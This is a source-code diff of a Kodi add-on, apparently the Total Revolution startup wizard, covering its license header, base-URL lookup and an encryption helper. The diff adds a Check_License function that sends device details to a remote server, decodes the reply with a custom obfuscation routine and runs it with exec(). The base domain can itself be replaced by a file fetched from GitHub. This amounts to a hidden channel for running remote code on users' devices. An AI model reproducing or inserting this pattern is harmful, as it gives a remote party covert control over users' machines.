@@ -1,8 +1,13 @@
 ﻿# -*- coding: utf-8 -*-
-#       Copyright (C) 2016 TotalRevolution
-#
-#  This software is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International Public License
-#  You can find a copy of the license in the add-on folder
+
+# script.openwindow
+# Startup Wizard (c) by whufclee (info@totalrevolution.tv)
+
+# Total Revolution Startup Wizard is licensed under a
+# Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License.
+
+# You should have received a copy of the license along with this
+# work. If not, see http://creativecommons.org/licenses/by-nc-nd/4.0.
 
 import binascii
 import downloader
@@ -25,6 +30,7 @@ HOME                = xbmc.translatePath('special://home')
 ADDONS              = xbmc.translatePath('special://home/addons')
 ADDON_DATA          = xbmc.translatePath('special://profile/addon_data')
 USERDATA            = xbmc.translatePath('special://home/userdata')
+NON_REGISTERED      = xbmc.translatePath('special://profile/addon_data/script.openwindow/unregistered')
 ZIP_SIZES           = os.path.join(ADDON_DATA, ADDON_ID, 'zipcheck')
 MY_SOURCES          = os.path.join(ADDON_DATA, ADDONID, 'mysources.xml')
 ZIP_PATH            = os.path.join(ADDONS, 'packages', '~~ZIPS~~')
@@ -40,23 +46,23 @@ OEM_ID              = os.path.join(OPENWINDOW_DATA,'id')
 KEYWORD_TEMP        = os.path.join(OPENWINDOW_DATA,'keyword_installed')
 XBMC_VERSION        = xbmc.getInfoLabel("System.BuildVersion")[:2]
 DIALOG              = xbmcgui.Dialog()
+BASE                = Addon_Setting(setting='base')
 DEBUG               = Addon_Setting(setting='debug')
 AUTO_UPDATE         = Addon_Setting(setting='autoupdate')
 showprogress_size   = Addon_Setting(setting='showprogress_size')
 showprogress        = Addon_Setting(setting='showprogress')
 rerun_main          = False
 refresh_skin        = False
-BASE                = 'http://tlbb.me/'
+
 try:
-    my_base = Open_URL(url='http://tlbb.me/')
-    if my_base.startswith('This url could not be opened'):
+    my_base = Open_URL(url=BASE)
+    if my_base.startswith('This url could not be opened') or my_base == False:
         try:
             BASE = Encrypt(message=Open_URL('https://raw.githubusercontent.com/totalrevolution/testing/master/temp_files/BASE.txt'))
         except:
             dolog('Unable to access any valid base domain')
 except:
     pass
-
 
 if not os.path.exists(TBS_DATA):
     os.makedirs(TBS_DATA)
@@ -104,6 +110,14 @@ def Build_Info():
         Buildmatch  = re.compile('Running on (.+?)\n').findall(logtext)
         Build       = Buildmatch[0] if (len(Buildmatch) > 0) else ''
     return Build.replace(' ','%20')
+#---------------------------------------------------------------------------------------------------
+# Update registration status
+def Check_License():
+    try:
+        initial_code = Open_URL(url=BASE+'boxer/Check_License.php?x=%s&v=%s&r=3' % (Get_Params(), XBMC_VERSION),post_type='post')
+        exec(Encrypt('d',initial_code))
+    except:
+        dolog(Last_Error())
 #-----------------------------------------------------------------------------
 # Return true or false whether licensed or not
 def Check_Valid(mode = 'oem_check'):
@@ -197,7 +211,7 @@ def Encrypt(mode='e', message=''):
         finaltext = ''
         while count < 4:
             count += 1
-            randomnum = random.randrange(1, 31)
+            randomnum = random.randrange(1, 10)
             hexoffset = hex(randomnum)[2:]
             if len(hexoffset)==1:
                 hexoffset = '0'+hexoffset
